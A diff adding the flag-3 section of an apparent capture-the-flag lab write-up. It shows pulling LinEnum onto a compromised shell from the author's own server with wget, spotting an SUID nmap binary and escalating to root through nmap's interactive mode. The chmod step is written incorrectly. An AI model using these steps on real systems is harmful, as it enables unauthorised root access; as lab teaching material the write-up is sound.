@@ -73,5 +73,30 @@ Once i had the user set as robot i was able to go to /home/robot and open key-2-
 
 # flag 3
 
+To get the root shell i needed more information so i put LinEnum on a webserver and downloaded it to the shell i had created in flag 2 using
+```
+wget IP:port/LinEnum.sh
+chmod -x LinEnum.sh
+```
+I then ran the script and found this
+```
+[+] Possibly interesting SUID files:
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+```
+This tells me i can exploit the nmap install on the server
+I went to GTFOBins and looked for NMAP
+
+I had to find the version of nmap running so i did 
+` /usr/local/bin/nmap `
+and found it was version 3.81
+meaning i could run the command
+
+```
+nmap --interactive
+!sh
+```
+After this you will have root access and in the root folder you will find key-3-of-3.txt
+
+# complete! 
 
 
